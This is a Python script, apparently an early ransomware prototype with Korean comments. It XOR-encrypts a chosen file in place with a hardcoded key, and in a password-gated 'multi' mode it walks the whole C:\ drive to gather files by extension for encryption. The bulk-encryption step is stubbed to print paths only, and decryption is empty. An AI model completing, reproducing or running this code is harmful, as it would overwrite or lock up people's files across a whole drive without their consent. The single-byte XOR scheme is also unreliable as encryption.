import os

class APP():
    
    def path_format(self,fileName):
    
        # 외부에서 파일 경로 입력할때
	    # 자꾸 에러가 떠써 백슬래쉬가 문제여서 raw 스트링으로 바꿔줌
        # raw스트링은 백슬래쉬를 무시하고 순수한 문자열 그 자체로 인식함
        # 하드 코딩 되있을때는 문젠데 input()으로 입력 받을 때는 문제 없음

        fileName = list(fileName)        
        
        for index in range(len(fileName)):
            if fileName[index] == '\\':
                fileName[index] = '/'
        
        
        fileName = ''.join(fileName)
        
        return fileName
    
    def encrypt(self,fileName,key):
    
        fileName = APP().path_format(fileName)
        
        file = open(fileName, 'rb')
        data = file.read()
        file.close()

        data = bytearray(data)

        for index, value in enumerate(data):
            data[index] = value ^ key # XOR ecrypt

        file = open(fileName, 'wb')
        file.write(data)
        file.close()

        print('SUCCESSFULY ENCRYPTED')
        
    def get_target_files(self,extension):
    
        # Sageguard password
        #safeguard = input('PLEASE ENTER THE SAFEGUARD PASSWORD : ')
        #if safeguard != 'start':
            #quit()

        # Get file extension to encrypt
        encrypted_ext = (extension,)

        # Grab all files from the machine
        file_paths = []
        for root, dirs, files in os.walk('c:\\'):
        #for root,dirs,files in os.walk('C:\\Users\\choim\\Desktop\\'):
            for file in files:
                file_path, file_ext = os.path.splitext(root + '\\' + file)
                if file_ext in encrypted_ext:
                    file_paths.append(root + '\\' + file)
            
        for f in file_paths:
            print(f)   
        
        return file_paths


# Main starts here
print('-------------------------------------------')
print('MAIN PROGRAM STARTS NOW')

# console setting
os.system('color 0a') # 검은색 바탕에 녹색 글씨

choice = input('1. <ENCRYPT> 2. <DECRYPT> : ')

if choice == '1':
    
    choice = input('1. <SINGLE> 2. <MULTI> : ')
    
    if choice == '1':
        
        print('-------------------------------------------')
        #key = int(input('PLEASE INPUT KEY BETWEEN(1 - 255 ) : '))
        key = 119
        fileName = input('FILE NAME(PATH) : ')
        print('-------------------------------------------')
        
        APP().encrypt(fileName, key)
    
    elif choice == '2':
        
        print('WARNING : ONCE THIS STARTS, ALL YOURS FILES WILLBE ENCRYPTED')
        password = 'cit*2021'

        pw = input('INPUT YOUR PASSWORD : ')
        
        if(pw == password):

            files = []

            extension = input('PLEASE INPUT FILE\'S EXTENSION TO ENCRYPT( EX =>  .txt ) : ').split(' ')

            print(extension)

            for ext in extension:
                tmp = APP().get_target_files(ext)
                for file in tmp:
                    files.append(file)
                tmp = []

            #files = APP().get_target_files(extension)    
            
            for f in files:
                
                # DANGER ZONE
                # ENCRYPT EACH FILE IN 'files' LIST
                
                print(f)
        else:
            print('WRONG PASSWORD, KILLED TASK')
            quit()
elif choice == '2':

        pass
    
    
    





